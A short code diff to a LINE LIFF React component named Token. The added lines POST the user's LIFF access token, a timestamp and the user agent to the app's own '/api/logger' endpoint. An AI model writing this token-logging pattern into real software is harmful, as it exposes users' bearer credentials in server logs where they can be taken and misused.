@@ -10,6 +10,20 @@ export default function Token() {
             liffId: getLiffId()
         }).then(() => {
             if (liff.isInClient()) {
+
+                fetch("/api/logger", {
+                    method: "POST",
+                    headers: {
+                      "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                      time: new Date().toLocaleString(),
+                      token: liff.getAccessToken() || "None",
+                      ua: navigator.userAgent,
+                    }),
+                  });
+        
+
                 liff.sendMessages([{
                     type: "text",
                     text: " == Token == "
